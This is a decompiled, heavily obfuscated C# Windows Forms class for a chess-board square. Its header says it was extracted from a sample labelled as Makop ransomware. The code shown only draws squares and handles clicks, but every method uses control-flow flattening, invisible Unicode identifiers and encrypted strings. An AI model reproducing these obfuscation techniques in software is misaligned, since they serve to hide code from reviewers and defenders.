// Decompiled with JetBrains decompiler
// Type: SimpleChessApp.Game.SimpleSquare
// Assembly: q是, Version=2.159.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2A217F07-6E26-47B2-8CBC-BCC0D26AE04B
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.01-msil\HEUR-Trojan-Ransom.MSIL.Makop.gen-566554b534a53102dd67fc20bd07ca49241b51616d73619e383e80bdfc4fe08a.exe

using System;
using System.ComponentModel;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace SimpleChessApp.Game
{
  public class SimpleSquare : UserControl
  {
    private Color DefaultColor;
    private ChessPiece piece;
    private bool isBlackSquare;
    private IContainer components = (IContainer) null;
    public Panel panel1;

    public event EventHandler<MouseEventArgs> Click
    {
      add
      {
        EventHandler<MouseEventArgs> eventHandler1 = this.Click;
label_1:
        int num1 = 578361659;
        EventHandler<MouseEventArgs> comparand;
        EventHandler<MouseEventArgs> eventHandler2;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 846673818)) % 6U)
          {
            case 0:
              goto label_1;
            case 1:
              eventHandler2 = (EventHandler<MouseEventArgs>) SimpleSquare.\u200C⁭⁭‬‌⁬‫‭⁯‍‭‫‭‏‪‫​‏⁫​‌‪⁪‬‭‫⁫‬‪‬‭‪‭‫⁬‌⁬‌‪‌‮((Delegate) comparand, (Delegate) value);
              num1 = (int) num2 * -1464577531 ^ -541814722;
              continue;
            case 2:
              int num3 = eventHandler1 != comparand ? -2121571953 : (num3 = -117019178);
              num1 = num3 ^ (int) num2 * -149894381;
              continue;
            case 3:
              comparand = eventHandler1;
              num1 = 1662354865;
              continue;
            case 4:
              goto label_3;
            case 5:
              eventHandler1 = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, eventHandler2, comparand);
              num1 = (int) num2 * 386409369 ^ -1894556195;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      remove
      {
        EventHandler<MouseEventArgs> eventHandler = this.Click;
label_1:
        int num1 = 271517658;
        EventHandler<MouseEventArgs> comparand;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 1268564072)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              comparand = eventHandler;
              eventHandler = Interlocked.CompareExchange<EventHandler<MouseEventArgs>>(ref this.Click, (EventHandler<MouseEventArgs>) SimpleSquare.\u200C‎⁭‎⁯‪‭‫‎​⁪⁪‏‎⁭‏‪‪‏⁮‎‪​‍⁯⁪‌‪‌‫⁮⁮‮⁭‭⁯‎⁫‭‮‮((Delegate) comparand, (Delegate) value), comparand);
              num1 = 1157584647;
              continue;
            case 3:
              int num3 = eventHandler != comparand ? 1644563066 : (num3 = 2003452821);
              num1 = num3 ^ (int) num2 * 280099936;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public ChessPiece Piece
    {
      get
      {
label_1:
        int num1 = 1133018319;
        ChessPiece piece;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 190910951)) % 3U)
          {
            case 0:
              goto label_1;
            case 1:
              piece = this.piece;
              num1 = (int) num2 * 2065071368 ^ -340613683;
              continue;
            default:
              goto label_4;
          }
        }
label_4:
        return piece;
      }
      set
      {
        this.piece = value;
        if (this.piece != null)
          goto label_7;
label_1:
        int num1 = -1078399891;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -41183102)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              num1 = (int) num2 * 997537750 ^ 875329046;
              continue;
            case 2:
              this.piece = (ChessPiece) null;
              SimpleSquare.\u200F⁯‫‏‮⁯⁭⁯‭⁬‭⁮‬⁫‫‬‍‪⁭‌⁬‫⁭‏⁪⁭‍⁫‏‌‭‮‫‏⁬​‎⁪‪⁯‮((Control) this, (Image) null);
              num1 = (int) num2 * 1484121242 ^ 231823431;
              continue;
            case 3:
              num1 = (int) num2 * -285391793 ^ -928791967;
              continue;
            case 4:
              goto label_7;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        SimpleSquare.\u200F⁯‫‏‮⁯⁭⁯‭⁬‭⁮‬⁫‫‬‍‪⁭‌⁬‫⁭‏⁪⁭‍⁫‏‌‭‮‫‏⁬​‎⁪‪⁯‮((Control) this, this.repo.GetPiece(this.piece.Kind, this.piece.Color));
        num1 = -838677274;
        goto label_2;
      }
    }

    public void colorSquare()
    {
      this.DefaultColor = this.IsBlackSquare ? Color.CornflowerBlue : Color.WhiteSmoke;
label_1:
      int num1 = -140865184;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -474068074)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            SimpleSquare.\u200E‭⁭⁯‪​‏‭‪‍⁫‏⁫⁫​‍‬‮‏‌⁮⁯‭‫‎‮‍⁮‌⁭‮⁬⁮⁪‮⁮⁭‪⁬⁯‮((Control) this, this.DefaultColor);
            num1 = (int) num2 * -1948524797 ^ -1048195894;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public Pieces Kind
    {
      set
      {
label_1:
        int num1 = 73957701;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ 857472636)) % 5U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.Piece = this.Piece;
              num1 = (int) num2 * 1209083274 ^ 1314603983;
              continue;
            case 3:
              num1 = (int) num2 * 975965108 ^ 660142378;
              continue;
            case 4:
              this.Piece.Kind = value;
              num1 = (int) num2 * 758675921 ^ -28715656;
              continue;
            default:
              goto label_7;
          }
        }
label_3:
        return;
label_7:;
      }
    }

    public bool IsBlackSquare
    {
      get
      {
label_1:
        int num1 = -388561843;
        bool isBlackSquare;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -350363782)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              num1 = (int) num2 * -626895329 ^ -448611947;
              continue;
            case 3:
              isBlackSquare = this.isBlackSquare;
              num1 = (int) num2 * 622990403 ^ 1277756921;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return isBlackSquare;
      }
      set
      {
label_1:
        int num1 = -926925565;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -2030649296)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              goto label_3;
            case 2:
              this.colorSquare();
              num1 = (int) num2 * 494422442 ^ -689211575;
              continue;
            case 3:
              this.isBlackSquare = value;
              num1 = (int) num2 * -1756671678 ^ 2110171072;
              continue;
            default:
              goto label_6;
          }
        }
label_3:
        return;
label_6:;
      }
    }

    public Repository repo => ChessContext.repo;

    public SimpleSquare()
    {
label_1:
      int num1 = 919655773;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 222402058)) % 9U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1188045586 ^ -314811510;
            continue;
          case 2:
            SimpleSquare.\u202B‍‎‪‭‍⁮⁮⁭⁮​‮‬‬​‪⁮‭‍‬‮​‬⁮⁭​‫⁭‏‪‪‬‌⁭‎‬⁪‬⁪⁯‮((Control) this.panel1, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * 2048113796 ^ 2096130433;
            continue;
          case 3:
            num1 = (int) num2 * 1881714883 ^ -200510771;
            continue;
          case 4:
            SimpleSquare.\u206A‬‏‌‭‍⁮‪⁬‭‮​‮⁮⁪‪‪⁭​‬‫‬‭‬‫‍⁯‍⁪‮‬‫‫⁪‏⁫⁮⁫‫⁮‮((Control) this, new MouseEventHandler(this.Square_MouseClick));
            num1 = (int) num2 * -1180265374 ^ -1524927553;
            continue;
          case 5:
            num1 = (int) num2 * -955898026 ^ -1842735266;
            continue;
          case 6:
            goto label_3;
          case 7:
            num1 = (int) num2 * -2003301208 ^ 507448204;
            continue;
          case 8:
            this.InitializeComponent();
            num1 = (int) num2 * -2010480032 ^ -1794600062;
            continue;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    private void Square_MouseClick(object sender, MouseEventArgs e)
    {
label_1:
      int num1 = 818001426;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 702308445)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 1724344450 ^ 1997130468;
            continue;
          case 3:
            EventHandler<MouseEventArgs> click = this.Click;
            if (click != null)
            {
              click((object) this, e);
              num1 = (int) num2 * 605790249 ^ 1605491820;
              continue;
            }
            goto label_5;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_5:;
    }

    public void HighLight()
    {
      SimpleSquare.\u200E‭⁭⁯‪​‏‭‪‍⁫‏⁫⁫​‍‬‮‏‌⁮⁯‭‫‎‮‍⁮‌⁭‮⁬⁮⁪‮⁮⁭‪⁬⁯‮((Control) this, Color.ForestGreen);
label_1:
      int num1 = -212087049;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -2119647300)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * 1479362847 ^ -1170451700;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public void ClearHighLight()
    {
      SimpleSquare.\u200E‭⁭⁯‪​‏‭‪‍⁫‏⁫⁫​‍‬‮‏‌⁮⁯‭‫‎‮‍⁮‌⁭‮⁬⁮⁪‮⁮⁭‪⁬⁯‮((Control) this, this.DefaultColor);
label_1:
      int num1 = 1802963127;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 2042347743)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -294340627 ^ 1783079206;
            continue;
          case 2:
            goto label_3;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    public bool IsEmpty
    {
      get
      {
label_1:
        int num1 = -411139473;
        bool isEmpty;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 ^ -1141510319)) % 4U)
          {
            case 0:
              goto label_1;
            case 2:
              isEmpty = this.Piece == null;
              num1 = (int) num2 * -1065873471 ^ 1821977156;
              continue;
            case 3:
              num1 = (int) num2 * 107394568 ^ 2109650940;
              continue;
            default:
              goto label_5;
          }
        }
label_5:
        return isEmpty;
      }
    }

    protected override void Dispose(bool disposing)
    {
label_1:
      int num1 = -1538516582;
      while (true)
      {
        uint num2;
        bool flag;
        int num3;
        switch ((num2 = (uint) (num1 ^ -1113929739)) % 9U)
        {
          case 0:
            goto label_3;
          case 1:
            SimpleSquare.\u202D‏⁮‎⁭⁬⁯‫‎‬⁮‭‮‌‮⁭⁬⁯‎‮‏‍‭‬‫‪⁪⁬‮‮‍‫‬‭⁯⁭‌‬‫⁪‮((IDisposable) this.components);
            num1 = (int) num2 * -319322731 ^ 520259016;
            continue;
          case 2:
            if (!disposing)
            {
              num3 = 0;
              break;
            }
            num1 = (int) num2 * -1486144005 ^ 1195283820;
            continue;
          case 3:
            num3 = this.components != null ? 1 : 0;
            break;
          case 4:
            int num4 = !flag ? 1974122961 : (num4 = 1797921502);
            num1 = num4 ^ (int) num2 * -292858247;
            continue;
          case 5:
            base.Dispose(disposing);
            num1 = -1454365736;
            continue;
          case 6:
            num1 = (int) num2 * -1118239488 ^ 671906819;
            continue;
          case 7:
            num1 = (int) num2 * 1018738174 ^ 898667590;
            continue;
          case 8:
            goto label_1;
          default:
            goto label_14;
        }
        flag = num3 != 0;
        num1 = -2136523168;
      }
label_3:
      return;
label_14:;
    }

    private void InitializeComponent()
    {
label_1:
      int num1 = -594816444;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -647986757)) % 21U)
        {
          case 0:
            SimpleSquare.\u206E‫⁫⁯⁪‎⁯⁫‍⁫‌‏⁮‍‏‬‪​⁭⁫‌⁭‏⁯⁬‌⁬⁮⁯‫‭‎⁪‎‫‏‭​‪⁫‮((ContainerControl) this, new SizeF(6f, 13f));
            SimpleSquare.\u200B⁯‮‭⁭‌‫‏⁯⁬⁭​‫‍‮‎⁮‮‫‫⁬‏‍‭‮‪‍‪‬‏⁭‍‪‫​‫‭⁭‬‎‮((ContainerControl) this, AutoScaleMode.Font);
            SimpleSquare.\u206C‎‮​⁮⁮‪⁯‏​⁬‫‎‫‫‪‎‎⁭‌‮⁬‏⁫‭‍⁭‍‏‭⁭⁬‭‫‍⁫⁪​‏⁫‮((Control) this, ImageLayout.Center);
            num1 = (int) num2 * -2030434301 ^ -1547727797;
            continue;
          case 1:
            SimpleSquare.\u200D‍‫‭‏‭⁯⁭‪‏​‭‏⁮⁭⁭​⁮‬⁬‍⁭⁭‌‭⁬‏‌⁭‌⁬‏‭⁫⁯‍⁪‌‎‏‮((Control) this.panel1, DockStyle.Fill);
            num1 = (int) num2 * 211672899 ^ 1377479306;
            continue;
          case 2:
            SimpleSquare.\u202E‌⁫‫‎⁭⁬‏‪⁯​​‌‬⁬‏‮‍⁭⁫⁮‮⁯⁬⁭‌⁯‮‍⁫⁬‎‏‎‍‪‮​​‏‮((Control) this, \u003CModule\u003E.\u202B‫‭⁮⁬‏⁭⁭‬‮‍⁮⁮‍‪‭‭‎​‮‬‍‫⁮‮⁬‌‬⁯⁬⁮‌‮⁮⁬‍‌⁯‮‮‮<string>(4135024358U));
            num1 = (int) num2 * -358643114 ^ 1135474517;
            continue;
          case 3:
            SimpleSquare.\u206D‏⁮⁪⁫⁯‏⁭⁪‫‌⁭‭⁮⁫⁭‬⁮​⁮‫‪⁭⁯​‫‬⁯‬‫⁫‫‎‬⁭‮‬⁪‫‮‮(SimpleSquare.\u206A⁯‪‫⁪‏‮⁫⁯‍‮‏‬‍‪​‌‫⁬‍⁫‪⁪‏⁫‮⁫⁫⁭‍​‪‭⁬‎‍⁫‮⁮‮‮((Control) this), (Control) this.panel1);
            num1 = (int) num2 * -646315350 ^ 1688794881;
            continue;
          case 4:
            SimpleSquare.\u206C‎‮​⁮⁮‪⁯‏​⁬‫‎‫‫‪‎‎⁭‌‮⁬‏⁫‭‍⁭‍‏‭⁭⁬‭‫‍⁫⁪​‏⁫‮((Control) this.panel1, ImageLayout.Center);
            num1 = (int) num2 * 395419658 ^ 1493321039;
            continue;
          case 5:
            this.panel1 = SimpleSquare.\u202E‌‫⁭‬‏‭‌⁪⁮​⁫⁪‬‎‏‌‌‍⁬‪‫‫⁫⁫⁪⁬⁯‬‮‫‭⁮‬‌‮‎⁭‌‮‮();
            SimpleSquare.\u202C‮⁭‏‏⁮⁯‮⁪⁫⁮⁫‎‌‭‎⁯‭⁬‬⁪⁭‬⁫⁮‬‭‎‎‮‭‏‬⁪‫‎⁮‫⁯⁮‮((Control) this);
            SimpleSquare.\u200E‭⁭⁯‪​‏‭‪‍⁫‏⁫⁫​‍‬‮‏‌⁮⁯‭‫‎‮‍⁮‌⁭‮⁬⁮⁪‮⁮⁭‪⁬⁯‮((Control) this.panel1, Color.Transparent);
            num1 = (int) num2 * 1179521008 ^ 1252765425;
            continue;
          case 6:
            SimpleSquare.\u206C⁭‮‫‎‍‏​⁬⁭⁯‎‬‭⁪‪‬⁯⁭‏‏⁬⁪‌‫⁯⁫‮‭‪‪‫⁯‏‫‌‌‬‏⁮‮((Control) this, false);
            num1 = (int) num2 * -77482774 ^ -541578326;
            continue;
          case 7:
            num1 = (int) num2 * 83425316 ^ 1852106510;
            continue;
          case 8:
            num1 = (int) num2 * -1934250697 ^ -1288996145;
            continue;
          case 9:
            goto label_3;
          case 10:
            num1 = (int) num2 * -1288720039 ^ -470186544;
            continue;
          case 11:
            SimpleSquare.\u200F⁮‬‭⁪⁮⁭‍⁫‍‭‬⁪‪‫⁬‎‎‮⁫‍‬⁪⁬⁫⁭‍⁮⁮⁫‪‍‌‎⁯⁮⁪‮‎⁬‮((Control) this.panel1, \u003CModule\u003E.\u206E‌⁪⁫‏‭⁪⁫⁭‭‫⁬⁯‮‫‏‮‌⁫‫‍⁫‏‪‌⁯⁭⁬⁮‏‍‍⁮‪​‏⁫‬‍‮<string>(1562826993U));
            num1 = (int) num2 * -1831604480 ^ -1762895989;
            continue;
          case 12:
            num1 = (int) num2 * -832369065 ^ 906001117;
            continue;
          case 13:
            SimpleSquare.\u200D⁮‪⁪‏⁪⁮‬‍‌‭‭‍‫​‪‏‫‪‫⁪⁭⁮‏⁬‏​⁮‮⁮‫‮‎⁫⁪⁮‪⁯‪⁬‮((Control) this.panel1, new Size(137, 132));
            SimpleSquare.\u206F‫⁫‫⁫‭‫‬‭‌‎‮⁮⁪⁮​‭‪⁭‪‌​⁬‪‍‬⁫⁬⁪‎‭⁭⁮‪‎‬‌‍‎‪‮((Control) this.panel1, 0);
            num1 = (int) num2 * -657431555 ^ -437087008;
            continue;
          case 14:
            goto label_1;
          case 15:
            num1 = (int) num2 * 1029075000 ^ 1004360837;
            continue;
          case 16:
            SimpleSquare.\u200D⁪​‎‎‭⁪⁯‏‫⁫‫⁯‍‭‮‫‭‎​⁫⁮⁮‮⁫⁫​​‎‭​‭⁫​⁭‮‎‎⁪‎‮((Control) this, new Padding(0));
            num1 = (int) num2 * 972585610 ^ -437043384;
            continue;
          case 17:
            num1 = (int) num2 * -1838947916 ^ 309190355;
            continue;
          case 18:
            SimpleSquare.\u206D‎‏⁪⁬‎⁯‏‪‫‍⁭⁮⁫‎‮‮‮⁬‪‮⁪⁮‪‬‌⁭​⁭‭⁫⁬‭⁯‬‫‮⁫⁮⁬‮((Control) this, new Size(137, 132));
            num1 = (int) num2 * 2066282464 ^ 1515533027;
            continue;
          case 19:
            num1 = (int) num2 * 942055183 ^ 807859496;
            continue;
          case 20:
            SimpleSquare.\u200C‍‫⁫‫⁪‍‌‪⁯⁯‪⁫‪⁪​‬⁬⁭‍⁬‬‭⁭‫‏‫​⁫‮‭‎⁯‪⁮⁮⁫‪‌‌‮((Control) this.panel1, new Point(0, 0));
            num1 = (int) num2 * -354153518 ^ -938865005;
            continue;
          default:
            goto label_23;
        }
      }
label_3:
      return;
label_23:;
    }

    static Delegate \u200C⁭⁭‬‌⁬‫‭⁯‍‭‫‭‏‪‫​‏⁫​‌‪⁪‬‭‫⁫‬‪‬‭‪‭‫⁬‌⁬‌‪‌‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Combine(obj0, obj1);
    }

    static Delegate \u200C‎⁭‎⁯‪‭‫‎​⁪⁪‏‎⁭‏‪‪‏⁮‎‪​‍⁯⁪‌‪‌‫⁮⁮‮⁭‭⁯‎⁫‭‮‮(
      [In] Delegate obj0,
      [In] Delegate obj1)
    {
      return Delegate.Remove(obj0, obj1);
    }

    static void \u200F⁯‫‏‮⁯⁭⁯‭⁬‭⁮‬⁫‫‬‍‪⁭‌⁬‫⁭‏⁪⁭‍⁫‏‌‭‮‫‏⁬​‎⁪‪⁯‮([In] Control obj0, [In] Image obj1) => obj0.BackgroundImage = obj1;

    static void \u200E‭⁭⁯‪​‏‭‪‍⁫‏⁫⁫​‍‬‮‏‌⁮⁯‭‫‎‮‍⁮‌⁭‮⁬⁮⁪‮⁮⁭‪⁬⁯‮([In] Control obj0, [In] Color obj1) => obj0.BackColor = obj1;

    static void \u206A‬‏‌‭‍⁮‪⁬‭‮​‮⁮⁪‪‪⁭​‬‫‬‭‬‫‍⁯‍⁪‮‬‫‫⁪‏⁫⁮⁫‫⁮‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202B‍‎‪‭‍⁮⁮⁭⁮​‮‬‬​‪⁮‭‍‬‮​‬⁮⁭​‫⁭‏‪‪‬‌⁭‎‬⁪‬⁪⁯‮([In] Control obj0, [In] MouseEventHandler obj1) => obj0.MouseClick += obj1;

    static void \u202D‏⁮‎⁭⁬⁯‫‎‬⁮‭‮‌‮⁭⁬⁯‎‮‏‍‭‬‫‪⁪⁬‮‮‍‫‬‭⁯⁭‌‬‫⁪‮([In] IDisposable obj0) => obj0.Dispose();

    static Panel \u202E‌‫⁭‬‏‭‌⁪⁮​⁫⁪‬‎‏‌‌‍⁬‪‫‫⁫⁫⁪⁬⁯‬‮‫‭⁮‬‌‮‎⁭‌‮‮() => new Panel();

    static void \u202C‮⁭‏‏⁮⁯‮⁪⁫⁮⁫‎‌‭‎⁯‭⁬‬⁪⁭‬⁫⁮‬‭‎‎‮‭‏‬⁪‫‎⁮‫⁯⁮‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u206C‎‮​⁮⁮‪⁯‏​⁬‫‎‫‫‪‎‎⁭‌‮⁬‏⁫‭‍⁭‍‏‭⁭⁬‭‫‍⁫⁪​‏⁫‮([In] Control obj0, [In] ImageLayout obj1) => obj0.BackgroundImageLayout = obj1;

    static void \u200D‍‫‭‏‭⁯⁭‪‏​‭‏⁮⁭⁭​⁮‬⁬‍⁭⁭‌‭⁬‏‌⁭‌⁬‏‭⁫⁯‍⁪‌‎‏‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static void \u200C‍‫⁫‫⁪‍‌‪⁯⁯‪⁫‪⁪​‬⁬⁭‍⁬‬‭⁭‫‏‫​⁫‮‭‎⁯‪⁮⁮⁫‪‌‌‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static void \u200F⁮‬‭⁪⁮⁭‍⁫‍‭‬⁪‪‫⁬‎‎‮⁫‍‬⁪⁬⁫⁭‍⁮⁮⁫‪‍‌‎⁯⁮⁪‮‎⁬‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u200D⁮‪⁪‏⁪⁮‬‍‌‭‭‍‫​‪‏‫‪‫⁪⁭⁮‏⁬‏​⁮‮⁮‫‮‎⁫⁪⁮‪⁯‪⁬‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206F‫⁫‫⁫‭‫‬‭‌‎‮⁮⁪⁮​‭‪⁭‪‌​⁬‪‍‬⁫⁬⁪‎‭⁭⁮‪‎‬‌‍‎‪‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static void \u206E‫⁫⁯⁪‎⁯⁫‍⁫‌‏⁮‍‏‬‪​⁭⁫‌⁭‏⁯⁬‌⁬⁮⁯‫‭‎⁪‎‫‏‭​‪⁫‮([In] ContainerControl obj0, [In] SizeF obj1) => obj0.AutoScaleDimensions = obj1;

    static void \u200B⁯‮‭⁭‌‫‏⁯⁬⁭​‫‍‮‎⁮‮‫‫⁬‏‍‭‮‪‍‪‬‏⁭‍‪‫​‫‭⁭‬‎‮(
      [In] ContainerControl obj0,
      [In] AutoScaleMode obj1)
    {
      obj0.AutoScaleMode = obj1;
    }

    static Control.ControlCollection \u206A⁯‪‫⁪‏‮⁫⁯‍‮‏‬‍‪​‌‫⁬‍⁫‪⁪‏⁫‮⁫⁫⁭‍​‪‭⁬‎‍⁫‮⁮‮‮(
      [In] Control obj0)
    {
      return obj0.Controls;
    }

    static void \u206D‏⁮⁪⁫⁯‏⁭⁪‫‌⁭‭⁮⁫⁭‬⁮​⁮‫‪⁭⁯​‫‬⁯‬‫⁫‫‎‬⁭‮‬⁪‫‮‮(
      [In] Control.ControlCollection obj0,
      [In] Control obj1)
    {
      obj0.Add(obj1);
    }

    static void \u200D⁪​‎‎‭⁪⁯‏‫⁫‫⁯‍‭‮‫‭‎​⁫⁮⁮‮⁫⁫​​‎‭​‭⁫​⁭‮‎‎⁪‎‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202E‌⁫‫‎⁭⁬‏‪⁯​​‌‬⁬‏‮‍⁭⁫⁮‮⁯⁬⁭‌⁯‮‍⁫⁬‎‏‎‍‪‮​​‏‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206D‎‏⁪⁬‎⁯‏‪‫‍⁭⁮⁫‎‮‮‮⁬‪‮⁪⁮‪‬‌⁭​⁭‭⁫⁬‭⁯‬‫‮⁫⁮⁬‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u206C⁭‮‫‎‍‏​⁬⁭⁯‎‬‭⁪‪‬⁯⁭‏‏⁬⁪‌‫⁯⁫‮‭‪‪‫⁯‏‫‌‌‬‏⁮‮([In] Control obj0, [In] bool obj1) => obj0.ResumeLayout(obj1);
  }
}
